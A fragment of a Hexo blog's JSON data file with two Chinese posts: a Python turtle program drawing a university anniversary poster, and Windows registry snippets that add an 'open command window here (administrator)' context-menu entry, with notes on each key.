k_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2458,"excerpt":"","more":"<blockquote>\n<p>Python作业，用turtle绘制校庆宣传画。</p>\n</blockquote>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> turtle</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_line</span>(<span class=\"params\">angle, length</span>):</span></span><br><span class=\"line\">    turtle.pendown()</span><br><span class=\"line\">    turtle.seth(angle)</span><br><span class=\"line\">    turtle.forward(length)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">locate</span>(<span class=\"params\">x, y, extend=None</span>):</span></span><br><span class=\"line\">    startx, starty = <span class=\"number\">-100</span>, <span class=\"number\">200</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> extend:</span><br><span class=\"line\">        extend.penup()</span><br><span class=\"line\">        extend.goto(startx + x, starty - y)</span><br><span class=\"line\">        extend.pendown()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        turtle.penup()</span><br><span class=\"line\">        turtle.goto(startx + x, starty - y)</span><br><span class=\"line\">        turtle.pendown()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_xq</span>():</span></span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">1</span>)</span><br><span class=\"line\">    turtle.penup()</span><br><span class=\"line\">    locate(<span class=\"number\">96</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">15</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">120</span>, <span class=\"number\">28</span>)</span><br><span class=\"line\">    turtle.fillcolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    turtle.seth(<span class=\"number\">120</span>)</span><br><span class=\"line\">    turtle.circle(<span class=\"number\">27</span>, <span class=\"number\">120</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">150</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    locate(<span class=\"number\">10</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">6</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">170</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">20</span>, <span class=\"number\">82</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">8</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">170</span>, <span class=\"number\">82</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">96</span>, <span class=\"number\">185</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">50</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">12</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">60</span>, <span class=\"number\">125</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">60</span>, <span class=\"number\">178</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">1</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">10</span>, <span class=\"number\">188</span>)</span><br><span class=\"line\">    turtle.begin_fill()</span><br><span class=\"line\">    draw_line(<span class=\"number\">270</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">240</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">240</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">88</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">120</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">120</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">90</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">180</span>, <span class=\"number\">169</span>)</span><br><span class=\"line\">    turtle.end_fill()</span><br><span class=\"line\">    turtle.pensize(<span class=\"number\">4</span>)</span><br><span class=\"line\">    turtle.pencolor(<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">8</span>, <span class=\"number\">208</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">58</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">60</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">53</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">300</span>, <span class=\"number\">9</span>)</span><br><span class=\"line\">    draw_line(<span class=\"number\">0</span>, <span class=\"number\">58</span>)</span><br><span class=\"line\">    turtle.hideturtle()</span><br><span class=\"line\">    font = turtle.Turtle()</span><br><span class=\"line\">    locate(<span class=\"number\">43</span>, <span class=\"number\">265</span>, font)</span><br><span class=\"line\">    font.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;1909-2019&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">16</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.hideturtle()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw_word</span>():</span></span><br><span class=\"line\">    font = turtle.Turtle()</span><br><span class=\"line\">    locate(<span class=\"number\">-186</span>, <span class=\"number\">350</span>, font)</span><br><span class=\"line\">    font.pencolor(<span class=\"string\">&#x27;white&#x27;</span>)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;河南理工大学建校110周年&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">36</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    locate(<span class=\"number\">-180</span>, <span class=\"number\">380</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;HENAN POLYTECHNIC UNIVERSITY 110TH ANNIVERSARY&#x27;</span>, font=(<span class=\"string\">&#x27;Aria&#x27;</span>, <span class=\"number\">16</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.color(<span class=\"number\">200</span>/<span class=\"number\">255</span>, <span class=\"number\">166</span>/<span class=\"number\">255</span>, <span class=\"number\">92</span>/<span class=\"number\">255</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">300</span>, <span class=\"number\">100</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;好学力行&#x27;</span>, font=(<span class=\"string\">&#x27;楷体&#x27;</span>, <span class=\"number\">24</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    locate(<span class=\"number\">-250</span>, <span class=\"number\">200</span>, font)</span><br><span class=\"line\">    font.write(<span class=\"string\">&#x27;明德任责&#x27;</span>, font=(<span class=\"string\">&#x27;楷体&#x27;</span>, <span class=\"number\">24</span>, <span class=\"string\">&#x27;bold&#x27;</span>))</span><br><span class=\"line\">    font.hideturtle()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    width, height = <span class=\"number\">800</span>, <span class=\"number\">600</span></span><br><span class=\"line\">    turtle.screensize(bg=<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">    turtle.setup(width, height, <span class=\"number\">400</span>, <span class=\"number\">100</span>)</span><br><span class=\"line\">    turtle.speed(<span class=\"number\">10</span>)</span><br><span class=\"line\">    draw_xq()</span><br><span class=\"line\">    draw_word()</span><br><span class=\"line\">    turtle.hideturtle()</span><br><span class=\"line\">    turtle.done()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p><strong>效果如下：</strong><br><img data-src=\"https://cdn.file.todest.cn/pic/2019101401.jpg\" alt=\"\"></p>\n"},{"title":"注册表相关操作","date":"2019-03-29T09:11:09.000Z","catogories":["操作系统","注册表"],"abbrlink":"11bb3efa","_content":"# 在此处打开命令窗口（管理员）\n## cmd\n```nohilight\nWindows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\n@=\"@shell32.dll,-8506\"\n\"NoWorkingDirectory\"=\"\"\n\"ShowBasedOnVelocityId\"=dword:00639bc8\n\"HasLUAShield\"=\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\n@=\"cmd.exe /s /k pushd \\\"%V\\\"\"\n```\n<!--more-->\n## powershell\n```nohilight\nWindows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\n@=\"@shell32.dll,-8508\"\n\"NoWorkingDirectory\"=\"\"\n\"ShowBasedOnVelocityId\"=dword:00639bc8\n\"HasLUAShield\"=\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\n@=\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -windowstyle hidden -Command $stpath = pwd; Start-Process PowerShell -ArgumentList \\\\\\\"-NoExit\\\\\\\", \\\\\\\"-Command Set-Location -literalPath '%V'\\\\\\\" -verb RunAs\"\n```\n# 相关解释\n## 项(K)\n`runas` 管理员运行\n`command` 运行时执行的命令\n## 字符串值(S) （REG_SZ）\n`(默认)` 显示的名称\n`Extended` 是否 shift 扩展\n`HasLUAShield` 是否显示用户账户控制图标\n`NoWorkingDirectory` 暂时未知\n## DWORD(32位)值 （D）\n`ShowBasedOnVelocityId` 暂时未知\n","source":"_posts/Regedit.md","raw":"---\ntitle: 注册表相关操作\ndate: 2019-03-29 17:11:09\ncatogories:\n  - 操作系统\n  - 注册表\ntags:\n  - cmd\n  - powershell\nabbrlink: 11bb3efa\n---\n# 在此处打开命令窗口（管理员）\n## cmd\n```nohilight\nWindows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\n@=\"@shell32.dll,-8506\"\n\"NoWorkingDirectory\"=\"\"\n\"ShowBasedOnVelocityId\"=dword:00639bc8\n\"HasLUAShield\"=\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\n@=\"cmd.exe /s /k pushd \\\"%V\\\"\"\n```\n<!--more-->\n## powershell\n```nohilight\nWindows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\n@=\"@shell32.dll,-8508\"\n\"NoWorkingDirectory\"=\"\"\n\"ShowBasedOnVelocityId\"=dword:00639bc8\n\"HasLUAShield\"=\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\n@=\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -windowstyle hidden -Command $stpath = pwd; Start-Process PowerShell -ArgumentList \\\\\\\"-NoExit\\\\\\\", \\\\\\\"-Command Set-Location -literalPath '%V'\\\\\\\" -verb RunAs\"\n```\n# 相关解释\n## 项(K)\n`runas` 管理员运行\n`command` 运行时执行的命令\n## 字符串值(S) （REG_SZ）\n`(默认)` 显示的名称\n`Extended` 是否 shift 扩展\n`HasLUAShield` 是否显示用户账户控制图标\n`NoWorkingDirectory` 暂时未知\n## DWORD(32位)值 （D）\n`ShowBasedOnVelocityId` 暂时未知\n","slug":"Regedit","published":1,"updated":"2020-05-11T09:41:10.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbo0029qse54hov8sqv","content":"<h1 id=\"在此处打开命令窗口（管理员）\"><a href=\"#在此处打开命令窗口（管理员）\" class=\"headerlink\" title=\"在此处打开命令窗口（管理员）\"></a>在此处打开命令窗口（管理员）</h1><h2 id=\"cmd\"><a href=\"#cmd\" class=\"headerlink\" title=\"cmd\"></a>cmd</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]</span><br><span class=\"line\">@&#x3D;&quot;@shell32.dll,-8506&quot;</span><br><span class=\"line\">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class=\"line\">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]</span><br><span class=\"line\">@&#x3D;&quot;cmd.exe &#x2F;s &#x2F;k pushd \\&quot;%V\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"powershell\"><a href=\"#powershell\" class=\"headerlink\" title=\"powershell\"></a>powershell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]</span><br><span class=\"line\">@&#x3D;&quot;@shell32.dll,-8508&quot;</span><br><span class=\"line\">&quot;NoWorkingDirectory&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\">&quot;ShowBasedOnVelocityId&quot;&#x3D;dword:00639bc8</span><br><span class=\"line\">&quot;HasLUAShield&quot;&#x3D;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]</span><br><span class=\"line\">@&#x3D;&quot;\\&quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\&quot; -windowstyle hidden -Command $stpath &#x3D; pwd; Start-Process PowerShell -ArgumentList \\\\\\&quot;-NoExit\\\\\\&quot;, \\\\\\&quot;-Command Set-Location -literalPath &#39;%V&#39;\\\\\\&quot; -verb RunAs&quot;</span><br></pre></td></tr></table></figure>\n<h1 id=\"相关解释\"><a href=\"#相关解释\" class=\"headerlink\" title=\"相关解释\"></a>相关解释</h1><h2 id=\"项-K\"><a href=\"#项-K\" class=\"headerlink\" title=\"项(K)\"></a>项(K)</h2><p><code>runas</code> 管理员运行<br><code>command</code> 运行时执行的命令</p>\n<h2 id=\"字符串值-S-（REG-SZ）\"><a href=\"#字符串值-S-（REG-SZ）\" class=\"headerlink\" title=\"字符串值(S) （REG_SZ）\"></a>字符串值(S) （REG_SZ）</h2><p><code>(默认)</code> 显示的名称<br><code>Extended</code> 是否 shift 扩展<br><code>HasLUAShield</code> 是否显示用户账户控制图标<br><code>NoWorkingDirectory</code> 暂时未知</p>\n<h2 id=\"DWORD-32位-值-（D）\"><a href=\"#DWORD-32位-值-（D）\" class=\"headerlink\" title=\"DWORD(32位)值 （D）\"></a>DWORD(32位)值 （D）</h2><p><code>ShowBasedOnVelocityId</code> 暂时未知</p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1189,"excerpt":"<h1 id=\"在此处打开命令窗口（管理员）\"><a href=\"#在此处打开命令窗口（管理员）\" class=\"headerlink\" title=\"在此处打开命令窗口（管理员）\"></a>在此处打开命令窗口（管理员）</h1><h2 id=\"cmd\"><a href=\"#cmd\" class=\"headerlink\" title=\"cmd\"></a>cmd</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows Registry Editor Version 5.00</span><br><span class=\"line\"></span><br><span class=\"line\">[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]</span><br><span 